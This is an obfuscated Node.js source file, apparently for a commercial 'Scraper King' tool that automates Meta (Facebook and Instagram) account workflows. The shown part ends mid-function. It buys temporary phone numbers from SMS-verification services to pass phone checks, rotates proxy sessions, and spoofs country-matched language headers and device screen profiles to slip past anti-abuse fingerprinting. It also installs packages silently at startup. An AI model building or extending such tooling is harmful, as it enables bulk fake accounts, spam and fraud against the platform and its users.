const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v88) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] Installing dependencies...");
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === "win32" ? "npm.cmd" : "npm"),
        v89 = {};
      v89.stdio = "inherit", v89.shell = true, execSync('\x22' + npmCmd + "\" install https-proxy-agent socks-proxy-agent chalk@4", v89);
    } catch (v90) {
      console.error("[ERROR] Failed to install dependencies."), process.exit(1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
process.on("uncaughtException", v91 => {
  const v92 = String(v91?.["message"] || ''),
    v93 = String(v91?.["code"] || '');
  if (v93 === "ECONNRESET" || v93 === "ETIMEDOUT" || v93 === "EPIPE" || v93 === "ENOTFOUND" || v93 === "ERR_STREAM_PREMATURE_CLOSE" || v92.includes("Client network socket disconnected") || v92.includes("TLS") || v92.includes("socket")) return;
  console.error("\n[FATAL] Uncaught Exception:", v91);
  process.exit(1);
});
const delay = (v94, v95) => new Promise(v96 => setTimeout(v96, v95 !== undefined ? v94 + Math.random() * (v95 - v94) : v94));
class NexaRateLimiter {
  constructor(v97) {
    this.delayMs = v97;
    this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v98) {
    return new Promise((v99, v100) => {
      {
        this.queue.push(async () => {
          try {
            v99(await v98());
          } catch (v101) {
            v100(v101);
          }
        });
        if (!this.processing) this._process();
      }
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      {
        const v102 = this.queue.shift();
        await v102(), await new Promise(v103 => setTimeout(v103, this.delayMs));
      }
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500),
  twoOoLimiter = new NexaRateLimiter(500),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  TWOOO_HOST = "api.2oo9.cloud",
  TWOOO_VOLTX_GET = "/MXS47FLFX0U/tnevs/@public/api/getnum",
  TWOOO_VOLTX_CONSOLE = "/MXS47FLFX0U/tnevs/@public/api/console";
(function () {
  const fn3 = function () {
    let v105;
    try {
      v105 = Function('return (function() {}.constructor("return this")( ));')();
    } catch (v106) {
      v105 = window;
    }
    return v105;
  };
  const v104 = fn3();
  v104.setInterval(fn2, 3500);
})();
const TWOOO_STEX_GET = "/MXS47FLFX0U/tness/@public/api/getnum",
  TWOOO_STEX_CONSOLE = "/MXS47FLFX0U/tness/@public/api/console";
function stripRid(v107) {
  return v107.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v108, v109, v110) {
  return new Promise((v111, v112) => {
    const v113 = stripRid(v109);
    const v114 = {};
    v114.rid = v113;
    const v115 = JSON.stringify(v114),
      v116 = {
        'hostname': TWOOO_HOST,
        'port': 0x1bb,
        'path': v110,
        'method': "POST",
        'headers': {
          'mauthapi': v108,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v115)
        }
      },
      v117 = https.request(v116, v118 => {
        let v119 = '';
        v118.on("data", v120 => v119 += v120), v118.on("end", () => {
          try {
            const v121 = JSON.parse(v119);
            if (v121?.["meta"]?.["code"] === 200 && v121?.["data"]?.["no_plus_number"]) v111(v121.data.no_plus_number);else v112(new Error(v121?.["message"] || v121?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v122) {
            v112(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v117.on("error", v123 => v112(new Error("2oo9 network: " + v123.message))), v117.setTimeout(10000, () => {
      v117.destroy(), v112(new Error("2oo9: Timeout"));
    }), v117.write(v115), v117.end();
  });
}
function twoOoFetchConsole(v124, v125) {
  return new Promise((v126, v127) => {
    const v128 = {};
    v128.mauthapi = v124;
    const v129 = {};
    v129.hostname = TWOOO_HOST;
    v129.port = 0x1bb, v129.path = v125, v129.method = "GET", v129.headers = v128;
    const v130 = v129,
      v131 = https.request(v130, v132 => {
        let v133 = '';
        v132.on("data", v134 => v133 += v134), v132.on("end", () => {
          try {
            const v135 = JSON.parse(v133);
            if (v135?.["meta"]?.["code"] === 200 && Array.isArray(v135?.["data"]?.["hits"])) v126(v135.data.hits);else v127(new Error(v135?.["message"] || "Console fetch failed"));
          } catch (v136) {
            v127(new Error("Console: Invalid JSON"));
          }
        });
      });
    v131.on("error", v137 => v127(new Error("Console network: " + v137.message)));
    v131.setTimeout(10000, () => {
      v131.destroy(), v127(new Error("Console timeout"));
    }), v131.end();
  });
}
function parseTwoOoRangeSelection(v138, v139) {
  const v140 = new Set(),
    v141 = v138.split(/[\s,]+/).filter(v142 => v142);
  for (const v143 of v141) {
    {
      const v144 = v143.match(/^(\d+)-(\d+)$/);
      if (v144) for (let v145 = +v144[1]; v145 <= +v144[2]; v145++) {
        {
          if (v145 >= 1 && v145 <= v139) v140.add(v145 - 1);
        }
      } else {
        {
          const v146 = parseInt(v143);
          if (!isNaN(v146) && v146 >= 1 && v146 <= v139) v140.add(v146 - 1);
        }
      }
    }
  }
  return [...v140].sort((v147, v148) => v147 - v148);
}
async function autoRangeFinderFor2Oo(v149, v150, v151, v152) {
  const v153 = {};
  v153.facebook = ["facebook", 'fb'];
  v153.instagram = ["instagram", 'ig'], v153.meta = ["meta"], v153.all = ["facebook", 'fb', "instagram", 'ig', "meta"];
  const v154 = v153,
    v155 = {};
  v155.facebook = "📘 Facebook", v155.instagram = "📸 Instagram", v155.meta = "🌐 Meta", v155.all = "📦 All (FB+IG+Meta)";
  const v156 = v155;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v157 = [];
  try {
    v157 = await twoOoFetchConsole(v149, v150);
  } catch (v166) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v166.message + '\x0a')), null;
  }
  const v158 = v157.slice(0, 100);
  if (v158.length === 0) {
    return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  }
  const v159 = await v151("Filter by app:", [{
      'name': "📘 Facebook",
      'value': "facebook"
    }, {
      'name': "📸 Instagram",
      'value': "instagram"
    }, {
      'name': "🌐 Meta",
      'value': "meta"
    }, {
      'name': "📦 All (FB+IG+Meta)",
      'value': "all"
    }]),
    v160 = v154[v159],
    v161 = v158.filter(v167 => {
      const v168 = (v167.sid || '').toLowerCase(),
        v169 = (v167.message || '').toLowerCase();
      return v160.some(v170 => v168.includes(v170) || v169.includes(v170));
    });
  if (v161.length === 0) {
    return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  }
  const v162 = {},
    v163 = {};
  for (const v171 of v161) {
    const v172 = v171.range || '';
    if (!v172) continue;
    v162[v172] = (v162[v172] || 0) + 1;
    const v173 = {};
    v173.facebook = 0x0, v173.instagram = 0x0, v173.meta = 0x0, v163[v172] = v163[v172] || v173;
    if (v154.facebook.some(v174 => (v171.sid || '').toLowerCase().includes(v174) || (v171.message || '').toLowerCase().includes(v174))) v163[v172].facebook++;
    if (v154.instagram.some(v175 => (v171.sid || '').toLowerCase().includes(v175) || (v171.message || '').toLowerCase().includes(v175))) v163[v172].instagram++;
    if (v154.meta.some(v176 => (v171.sid || '').toLowerCase().includes(v176) || (v171.message || '').toLowerCase().includes(v176))) v163[v172].meta++;
  }
  const v164 = Object.entries(v162).sort((v177, v178) => v178[1] - v177[1]).slice(0, 5);
  if (v164.length === 0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v165 = await v151("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v165 === "auto") {
    const [v179, v180] = v164[0],
      v181 = v163[v179] || {},
      v182 = [];
    if (v181.facebook) v182.push("📘FB(" + v181.facebook + ')');
    if (v181.instagram) v182.push("📸IG(" + v181.instagram + ')');
    if (v181.meta) v182.push("🌐Meta(" + v181.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v179 + "  (" + v180 + " hits)  " + v182.join('\x20') + '\x0a')), [v179];
  } else {
    console.log(chalk.cyan("\n  App: " + v156[v159] + "  |  Scanned: " + v161.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(22))), v164.forEach(([v186, v187], v188) => {
      const v189 = v163[v186] || {},
        v190 = [];
      if (v189.facebook) v190.push("📘FB(" + v189.facebook + ')');
      if (v189.instagram) v190.push("📸IG(" + v189.instagram + ')');
      if (v189.meta) v190.push("🌐Meta(" + v189.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v188 + 1).padEnd(3) + '\x20') + chalk.green(v186.padEnd(16)) + chalk.yellow(String(v187).padEnd(5)) + chalk.gray('█'.repeat(Math.min(v187, 12)) + '\x20\x20') + (v190.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v183 = await v152("Select ranges:", ''),
      v184 = parseTwoOoRangeSelection(v183, v164.length);
    if (v184.length === 0) {
      return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    }
    const v185 = v184.map(v191 => v164[v191][0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v185.join(',\x20') + '\x0a')), v185;
  }
}
const SMSBOWER_HOST = "smsbower.page",
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v192) {
  return new Promise((v193, v194) => {
    const v195 = {};
    v195.hostname = SMSBOWER_HOST, v195.port = 0x1bb;
    v195.path = "/stubs/handler_api.php?" + v192;
    v195.method = "GET", v195.headers = {}, v195.headers.Accept = "text/plain";
    v195.headers.Connection = "close";
    const v196 = v195;
    const v197 = https.request(v196, v198 => {
      {
        let v199 = '';
        v198.on("data", v200 => v199 += v200), v198.on("end", () => v193(v199.trim()));
      }
    });
    v197.on("error", v201 => v194(new Error("SmsBower net: " + v201.message))), v197.setTimeout(15000, () => {
      v197.destroy(), v194(new Error("SmsBower timeout"));
    }), v197.end();
  });
}
function smsBowerFetchNumber(v202, v203, v204, v205) {
  let v206 = "api_key=" + encodeURIComponent(v202) + "&action=getNumber&service=" + encodeURIComponent(v203 || 'fb');
  v204 && String(v204).trim() !== '0' && String(v204).trim() !== '' && (v206 += "&country=" + encodeURIComponent(v204));
  v205 && parseFloat(v205) > 0 && (v206 += "&maxPrice=" + encodeURIComponent(v205));
  return smsBowerRequest(v206).then(v207 => {
    if (v207.startsWith("ACCESS_NUMBER:")) {
      {
        const v208 = v207.split(':');
        return {
          'activationId': v208[1],
          'phoneNumber': v208[2].replace(/[^0-9]/g, '')
        };
      }
    }
    throw new Error("SmsBower: " + v207);
  });
}
const ZENEX_HOST = "api.zenexnetwork.com",
  ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v209, v210) {
  return new Promise((v211, v212) => {
    const v213 = {};
    v213.range = v210, v213.is_national = false;
    v213.remove_plus = false;
    const v214 = JSON.stringify(v213),
      v215 = {
        'hostname': ZENEX_HOST,
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v209,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v214)
        }
      },
      v216 = https.request(v215, v217 => {
        {
          let v218 = '';
          v217.on("data", v219 => v218 += v219), v217.on("end", () => {
            try {
              const v220 = JSON.parse(v218);
              if (v220?.["meta"]?.["code"] === 200 && v220?.["data"]?.["full_number"]) v211(v220.data.full_number.replace(/[^0-9]/g, ''));else v212(new Error(v220?.["message"] || "Zenex: no number"));
            } catch (v221) {
              v212(new Error("Zenex: invalid JSON"));
            }
          });
        }
      });
    v216.on("error", v222 => v212(new Error("Zenex net: " + v222.message)));
    v216.setTimeout(15000, () => {
      v216.destroy();
      v212(new Error("Zenex timeout"));
    }), v216.write(v214);
    v216.end();
  });
}
function nexaFetchNumber(v223, v224, v225) {
  return new Promise((v226, v227) => {
    {
      const v228 = {};
      v228.range = v224, v228.format = "normal";
      const v229 = JSON.stringify(v228),
        v230 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v225 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v223,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v229)
          }
        },
        v231 = http.request(v230, v232 => {
          let v233 = '';
          v232.on("data", v234 => v233 += v234);
          v232.on("end", () => {
            try {
              {
                const v235 = JSON.parse(v233);
                if (v235.success && v235.number) v226(v235.number.replace(/[^0-9]/g, ''));else {
                  v227(new Error(v235.error || "NexaOTP: No number returned"));
                }
              }
            } catch (v236) {
              v227(new Error("NexaOTP: Invalid response"));
            }
          });
        });
      v231.on("error", v237 => v227(new Error("NexaOTP network: " + v237.message))), v231.setTimeout(10000, () => {
        v231.destroy(), v227(new Error("NexaOTP: Timeout"));
      }), v231.write(v229), v231.end();
    }
  });
}
function debugLog(v238, v239, v240, v241 = null) {}
const B = chalk.hex("#00FF88"),
  C = chalk.hex("#1877F2"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B"),
  M = chalk.hex("#9370DB");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(C("   ____                                      _  ___              "));
    console.log(C("  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  "));
    console.log(C("  \\___ \\ / __| '__/ _` | '_ \\ / _ \\ '__|    | ' <| | '_ \\ / _` | "));
    console.log(C("   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | "));
    console.log(C("  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | "));
    console.log(C("                       |_|                                |___/  \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Tool      : ") + C("SK — Meta APK (Stella)       ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/scraper_king            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Version   : ") + Y("V6.0.1 (APK Flow)            ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
let _displayNames;
try {
  const v242 = {};
  v242.type = "region", _displayNames = new Intl.DisplayNames(['en'], v242);
} catch (v243) {
  const v244 = {};
  v244.of = v245 => v245, _displayNames = v244;
}
function rotateSessionId(v246) {
  if (!v246 || !v246.user) return v246;
  const v247 = {
      ...v246
    },
    v248 = v247,
    v249 = [/-ssid-[A-Za-z0-9_]+/, /-session-[A-Za-z0-9_]+/, /_session_[A-Za-z0-9_]+/, /-sess-[A-Za-z0-9_]+/];
  for (const v250 of v249) {
    if (v248.user && v250.test(v248.user)) {
      {
        const v251 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v248.user = v248.user.replace(v250, '' + v250.source.split('[')[0].replace(/\\/g, '') + v251);
        break;
      }
    }
    if (v248.pass && v250.test(v248.pass)) {
      const v252 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v248.pass = v248.pass.replace(v250, '' + v250.source.split('[')[0].replace(/\\/g, '') + v252);
      break;
    }
  }
  return v248;
}
function parseProxy(v253) {
  if (!v253) return null;
  if (typeof v253 === "object") return v253;
  v253 = v253.trim();
  if (!v253) return null;
  let v254, v255, v256, v257;
  if (v253.includes("://")) v253 = v253.split("://")[1];
  if (v253.includes('@')) {
    const v259 = v253.split('@'),
      v260 = v259[0].split(':'),
      v261 = v259[1].split(':');
    v256 = v260[0], v257 = v260[1], v254 = v261[0], v255 = parseInt(v261[1]);
  } else {
    {
      const v262 = v253.split(':');
      if (v262.length === 2) v254 = v262[0], v255 = parseInt(v262[1]);else {
        if (v262.length === 4) {
          {
            if (!isNaN(parseInt(v262[3])) && isNaN(parseInt(v262[1]))) v256 = v262[0], v257 = v262[1], v254 = v262[2], v255 = parseInt(v262[3]);else {
              v254 = v262[0], v255 = parseInt(v262[1]), v256 = v262[2], v257 = v262[3];
            }
          }
        } else v262.length === 3 && (v254 = v262[0], v255 = parseInt(v262[1]), v256 = v262[2]);
      }
    }
  }
  if (!v254 || !v255) return null;
  const v258 = {};
  v258.type = "http", v258.host = v254;
  return v258.port = v255, v258.user = v256, v258.pass = v257, v258.original = v253, v258;
}
function createProxyAgent(v263) {
  if (!v263) return null;
  let v264 = '';
  if (v263.type === "socks5" || v263.type === "socks4") {
    return v264 = "socks5://" + (v263.user ? v263.user + ':' + v263.pass + '@' : '') + v263.host + ':' + v263.port, new SocksProxyAgent(v264);
  } else return v264 = "http://" + (v263.user ? v263.user + ':' + v263.pass + '@' : '') + v263.host + ':' + v263.port, new HttpsProxyAgent(v264);
}
function getProxyCountry(v265) {
  if (!v265) return "Proxy";
  const v266 = (v265.user || '').toLowerCase();
  let v267 = null;
  const v268 = v266.match(/_cr\.([a-z]{2})\b/);
  if (v268) v267 = v268[1].toUpperCase();
  if (!v267) {
    {
      const v269 = v266.match(/_zone_([a-z]{2})(?:_|$)/);
      if (v269) v267 = v269[1].toUpperCase();
    }
  }
  if (!v267) {
    {
      const v270 = v266.match(/[_\-]country[_\-]([a-z]{2})/i) || v266.match(/[_\-]cc[_\-]([a-z]{2})/i) || v266.match(/customer[_\-]([a-z]{2})\b/i);
      if (v270) v267 = v270[1].toUpperCase();
    }
  }
  if (!v267) return "Proxy";
  try {
    return _displayNames.of(v267) || v267;
  } catch (v271) {
    return v267;
  }
}
const DIAL_MAP = [["1868", 'TT', "en-TT,en;q=0.9"], ["1876", 'JM', "en-JM,en;q=0.9"], ["1809", 'DO', "es-DO,es;q=0.9,en;q=0.8"], ["1829", 'DO', "es-DO,es;q=0.9,en;q=0.8"], ["1849", 'DO', "es-DO,es;q=0.9,en;q=0.8"], ["880", 'BD', "bn-BD,bn;q=0.9,en;q=0.8"], ["855", 'KH', "km-KH,km;q=0.9,en;q=0.8"], ["856", 'LA', "lo-LA,lo;q=0.9,en;q=0.8"], ["228", 'TG', "fr-TG,fr;q=0.9,en;q=0.8"], ["229", 'BJ', "fr-BJ,fr;q=0.9,en;q=0.8"], ["233", 'GH', "en-GH,en;q=0.9"], ["234", 'NG', "en-NG,en;q=0.9"], ["237", 'CM', "fr-CM,fr;q=0.9,en;q=0.8"], ["243", 'CD', "fr-CD,fr;q=0.9"], ["254", 'KE', "sw-KE,sw;q=0.9,en;q=0.8"], ["255", 'TZ', "sw-TZ,sw;q=0.9,en;q=0.8"], ["256", 'UG', "en-UG,en;q=0.9"], ["260", 'ZM', "en-ZM,en;q=0.9"], ["263", 'ZW', "en-ZW,en;q=0.9"], ["212", 'MA', "ar-MA,ar;q=0.9,fr;q=0.8"], ["213", 'DZ', "ar-DZ,ar;q=0.9,fr;q=0.8"], ["216", 'TN', "ar-TN,ar;q=0.9,fr;q=0.8"], ["218", 'LY', "ar-LY,ar;q=0.9,en;q=0.8"], ["220", 'GM', "en-GM,en;q=0.9"], ["221", 'SN', "fr-SN,fr;q=0.9"], ["222", 'MR', "ar-MR,ar;q=0.9,fr;q=0.8"], ["223", 'ML', "fr-ML,fr;q=0.9"], ["224", 'GN', "fr-GN,fr;q=0.9"], ["225", 'CI', "fr-CI,fr;q=0.9"], ["226", 'BF', "fr-BF,fr;q=0.9"], ["227", 'NE', "fr-NE,fr;q=0.9"], ["230", 'MU', "en-MU,en;q=0.9,fr;q=0.8"], ["231", 'LR', "en-LR,en;q=0.9"], ["232", 'SL', "en-SL,en;q=0.9"], ["235", 'TD', "fr-TD,fr;q=0.9,ar;q=0.8"], ["236", 'CF', "fr-CF,fr;q=0.9"], ["238", 'CV', "pt-CV,pt;q=0.9"], ["239", 'ST', "pt-ST,pt;q=0.9"], ["240", 'GQ', "es-GQ,es;q=0.9"], ["241", 'GA', "fr-GA,fr;q=0.9"], ["242", 'CG', "fr-CG,fr;q=0.9"], ["244", 'AO', "pt-AO,pt;q=0.9"], ["245", 'GW', "pt-GW,pt;q=0.9"], ["246", 'IO', "en-IO,en;q=0.9"], ["247", 'AC', "en-AC,en;q=0.9"], ["248", 'SC', "en-SC,en;q=0.9,fr;q=0.8"], ["249", 'SD', "ar-SD,ar;q=0.9,en;q=0.8"], ["250", 'RW', "rw-RW,rw;q=0.9,en;q=0.8,fr;q=0.7"], ["251", 'ET', "am-ET,am;q=0.9,en;q=0.8"], ["252", 'SO', "so-SO,so;q=0.9,ar;q=0.8,en;q=0.7"], ["253", 'DJ', "fr-DJ,fr;q=0.9,ar;q=0.8"], ["257", 'BI', "fr-BI,fr;q=0.9,rn;q=0.8"], ["258", 'MZ', "pt-MZ,pt;q=0.9"], ["261", 'MG', "mg-MG,mg;q=0.9,fr;q=0.8"], ["262", 'RE', "fr-RE,fr;q=0.9"], ["264", 'NA', "en-NA,en;q=0.9"], ["265", 'MW', "en-MW,en;q=0.9"], ["266", 'LS', "en-LS,en;q=0.9"], ["267", 'BW', "en-BW,en;q=0.9"], ["268", 'SZ', "en-SZ,en;q=0.9"], ["269", 'KM', "fr-KM,fr;q=0.9,ar;q=0.8"], ["966", 'SA', "ar-SA,ar;q=0.9,en;q=0.8"], ["971", 'AE', "ar-AE,ar;q=0.9,en;q=0.8"], ["973", 'BH', "ar-BH,ar;q=0.9,en;q=0.8"], ["974", 'QA', "ar-QA,ar;q=0.9,en;q=0.8"], ["968", 'OM', "ar-OM,ar;q=0.9,en;q=0.8"], ["965", 'KW', "ar-KW,ar;q=0.9,en;q=0.8"], ["964", 'IQ', "ar-IQ,ar;q=0.9,en;q=0.8"], ["963", 'SY', "ar-SY,ar;q=0.9,en;q=0.8"], ["962", 'JO', "ar-JO,ar;q=0.9,en;q=0.8"], ["961", 'LB', "ar-LB,ar;q=0.9,en;q=0.8,fr;q=0.7"], ["967", 'YE', "ar-YE,ar;q=0.9,en;q=0.8"], ["970", 'PS', "ar-PS,ar;q=0.9,en;q=0.8"], ["972", 'IL', "he-IL,he;q=0.9,en;q=0.8"], ["992", 'TJ', "tg-TJ,tg;q=0.9,ru;q=0.8"], ["993", 'TM', "tk-TM,tk;q=0.9,ru;q=0.8"], ["994", 'AZ', "az-AZ,az;q=0.9,ru;q=0.8"], ["995", 'GE', "ka-GE,ka;q=0.9,en;q=0.8"], ["996", 'KG', "ky-KG,ky;q=0.9,ru;q=0.8"], ["998", 'UZ', "uz-UZ,uz;q=0.9,ru;q=0.8"], ["977", 'NP', "ne-NP,ne;q=0.9,en;q=0.8"], ["975", 'BT', "dz-BT,dz;q=0.9,en;q=0.8"], ["959", 'MM', "my-MM,my;q=0.9,en;q=0.8"], ["670", 'TL', "pt-TL,pt;q=0.9,en;q=0.8"], ["673", 'BN', "ms-BN,ms;q=0.9,en;q=0.8"], ["676", 'TO', "en-TO,en;q=0.9"], ["677", 'SB', "en-SB,en;q=0.9"], ["678", 'VU', "en-VU,en;q=0.9,fr;q=0.8"], ["679", 'FJ', "en-FJ,en;q=0.9"], ["680", 'PW', "en-PW,en;q=0.9"], ["591", 'BO', "es-BO,es;q=0.9,en;q=0.8"], ["592", 'GY', "en-GY,en;q=0.9"], ["593", 'EC', "es-EC,es;q=0.9,en;q=0.8"], ["594", 'GF', "fr-GF,fr;q=0.9"], ["595", 'PY', "es-PY,es;q=0.9,en;q=0.8"], ["596", 'MQ', "fr-MQ,fr;q=0.9"], ["597", 'SR', "nl-SR,nl;q=0.9,en;q=0.8"], ["598", 'UY', "es-UY,es;q=0.9,en;q=0.8"], ["387", 'BA', "bs-BA,bs;q=0.9,hr;q=0.8,en;q=0.7"], ["385", 'HR', "hr-HR,hr;q=0.9,en;q=0.8"], ["386", 'SI', "sl-SI,sl;q=0.9,en;q=0.8"], ["389", 'MK', "mk-MK,mk;q=0.9,en;q=0.8"], ["381", 'RS', "sr-RS,sr;q=0.9,en;q=0.8"], ["382", 'ME', "sr-ME,sr;q=0.9,en;q=0.8"], ["383", 'XK', "sq-XK,sq;q=0.9,sr;q=0.8,en;q=0.7"], ["355", 'AL', "sq-AL,sq;q=0.9,en;q=0.8"], ["356", 'MT', "mt-MT,mt;q=0.9,en;q=0.8"], ["357", 'CY', "el-CY,el;q=0.9,en;q=0.8"], ["358", 'FI', "fi-FI,fi;q=0.9,sv;q=0.8,en;q=0.7"], ["359", 'BG', "bg-BG,bg;q=0.9,en;q=0.8"], ["370", 'LT', "lt-LT,lt;q=0.9,en;q=0.8"], ["371", 'LV', "lv-LV,lv;q=0.9,en;q=0.8"], ["372", 'EE', "et-EE,et;q=0.9,en;q=0.8"], ["373", 'MD', "ro-MD,ro;q=0.9,ru;q=0.8,en;q=0.7"], ["374", 'AM', "hy-AM,hy;q=0.9,en;q=0.8"], ["375", 'BY', "be-BY,be;q=0.9,ru;q=0.8,en;q=0.7"], ["376", 'AD', "ca-AD,ca;q=0.9,es;q=0.8,en;q=0.7"], ["377", 'MC', "fr-MC,fr;q=0.9,en;q=0.8"], ["378", 'SM', "it-SM,it;q=0.9,en;q=0.8"], ["380", 'UA', "uk-UA,uk;q=0.9,ru;q=0.8,en;q=0.7"], ["420", 'CZ', "cs-CZ,cs;q=0.9,en;q=0.8"], ["421", 'SK', "sk-SK,sk;q=0.9,en;q=0.8"], ["423", 'LI', "de-LI,de;q=0.9,en;q=0.8"], ['20', 'EG', "ar-EG,ar;q=0.9,en;q=0.8"], ['27', 'ZA', "en-ZA,en;q=0.9"], ['30', 'GR', "el-GR,el;q=0.9,en;q=0.8"], ['31', 'NL', "nl-NL,nl;q=0.9,en;q=0.8"], ['32', 'BE', "nl-BE,nl;q=0.9,fr;q=0.8,en;q=0.7"], ['33', 'FR', "fr-FR,fr;q=0.9,en;q=0.8"], ['34', 'ES', "es-ES,es;q=0.9,en;q=0.8"], ['36', 'HU', "hu-HU,hu;q=0.9,en;q=0.8"], ['39', 'IT', "it-IT,it;q=0.9,en;q=0.8"], ['40', 'RO', "ro-RO,ro;q=0.9,en;q=0.8"], ['41', 'CH', "de-CH,de;q=0.9,fr;q=0.8,en;q=0.7"], ['43', 'AT', "de-AT,de;q=0.9,en;q=0.8"], ['44', 'GB', "en-GB,en;q=0.9"], ['45', 'DK', "da-DK,da;q=0.9,en;q=0.8"], ['46', 'SE', "sv-SE,sv;q=0.9,en;q=0.8"], ['47', 'NO', "nb-NO,nb;q=0.9,en;q=0.8"], ['48', 'PL', "pl-PL,pl;q=0.9,en;q=0.8"], ['49', 'DE', "de-DE,de;q=0.9,en;q=0.8"], ['51', 'PE', "es-PE,es;q=0.9,en;q=0.8"], ['52', 'MX', "es-MX,es;q=0.9,en;q=0.8"], ['53', 'CU', "es-CU,es;q=0.9"], ['54', 'AR', "es-AR,es;q=0.9,en;q=0.8"], ['55', 'BR', "pt-BR,pt;q=0.9,en;q=0.8"], ['56', 'CL', "es-CL,es;q=0.9,en;q=0.8"], ['57', 'CO', "es-CO,es;q=0.9,en;q=0.8"], ['58', 'VE', "es-VE,es;q=0.9,en;q=0.8"], ['60', 'MY', "ms-MY,ms;q=0.9,en;q=0.8"], ['61', 'AU', "en-AU,en;q=0.9"], ['62', 'ID', "id-ID,id;q=0.9,en;q=0.8"], ['63', 'PH', "en-PH,en;q=0.9,fil;q=0.8"], ['64', 'NZ', "en-NZ,en;q=0.9"], ['65', 'SG', "en-SG,en;q=0.9,zh;q=0.8"], ['66', 'TH', "th-TH,th;q=0.9,en;q=0.8"], ['81', 'JP', "ja-JP,ja;q=0.9,en;q=0.8"], ['82', 'KR', "ko-KR,ko;q=0.9,en;q=0.8"], ['84', 'VN', "vi-VN,vi;q=0.9,en;q=0.8"], ['86', 'CN', "zh-CN,zh;q=0.9,en;q=0.8"], ['90', 'TR', "tr-TR,tr;q=0.9,en;q=0.8"], ['91', 'IN', "hi-IN,hi;q=0.9,en;q=0.8"], ['92', 'PK', "ur-PK,ur;q=0.9,en;q=0.8"], ['93', 'AF', "ps-AF,ps;q=0.9,en;q=0.8"], ['94', 'LK', "si-LK,si;q=0.9,en;q=0.8"], ['95', 'MM', "my-MM,my;q=0.9,en;q=0.8"], ['98', 'IR', "fa-IR,fa;q=0.9,en;q=0.8"], ['1', 'US', "en-US,en;q=0.9"], ['7', 'RU', "ru-RU,ru;q=0.9,en;q=0.8"]];
function getCountryFromPhone(v272) {
  for (const [v274, v275, v276] of DIAL_MAP) {
    {
      const v277 = {};
      v277.iso = v275, v277.lang = v276;
      if (v272.startsWith(v274)) return v277;
    }
  }
  const v273 = {};
  return v273.iso = 'US', v273.lang = "en-US,en;q=0.9", v273;
}
function getRandomScreenDensity() {
  const v278 = {};
  v278.density = "2.0", v278.width = 0x438, v278.height = 0x780, v278.dpi = 0x140;
  const v279 = {};
  v279.density = "2.625", v279.width = 0x438, v279.height = 0x6ed;
  v279.dpi = 0x1a4;
  const v280 = {};
  v280.density = "2.625", v280.width = 0x438, v280.height = 0x924, v280.dpi = 0x1a4;
  const v281 = {};
  v281.density = "2.625", v281.width = 0x438, v281.height = 0x960, v281.dpi = 0x1a4;
  const v282 = {};
  v282.density = "2.75", v282.width = 0x438, v282.height = 0x960, v282.dpi = 0x1b8;
  const v283 = {};
  v283.density = "3.0", v283.width = 0x438, v283.height = 0x924, v283.dpi = 0x1e0;
  const v284 = {};
  v284.density = "3.0", v284.width = 0x438, v284.height = 0x960, v284.dpi = 0x1e0;
  const v285 = {};
